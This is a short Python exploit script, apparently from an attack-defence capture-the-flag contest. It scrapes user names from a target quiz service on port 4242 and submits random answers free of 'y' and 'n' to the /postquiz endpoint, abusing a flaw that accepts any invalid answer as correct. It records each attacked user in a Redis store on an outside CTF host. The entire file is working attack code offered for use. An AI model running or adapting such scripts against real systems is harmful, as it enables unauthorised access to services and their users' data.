#!/usr/bin/env python3

# if we post not 'y' or 'n' letter in answer - system accept it as correct answer
# this sploit pwn it simply :)

from libsplo import *
import sys
import re
import random
import string

st = DictStorage(RedisConnector("loli_invalid_answer", "redis://redis.kappactf.ru"))
ip = sys.argv[1]

resp = requests.get(f"http://{ip}:4242/").text
users = re.findall(r'<th scope="row" class="align-middle">(.*)</th><td class="align-middle">30', resp)
users = set(users)

users -= set(st.keys())

for user in users:
	answer = ''.join([random.choice(string.ascii_letters) for _ in range(30)]).replace("y", "1").replace("n", "2")
	resp = requests.get(f"http://{ip}:4242/postquiz?name={user}&answer={answer}").text
	print(resp, flush=True)
	st.set(user, "1")
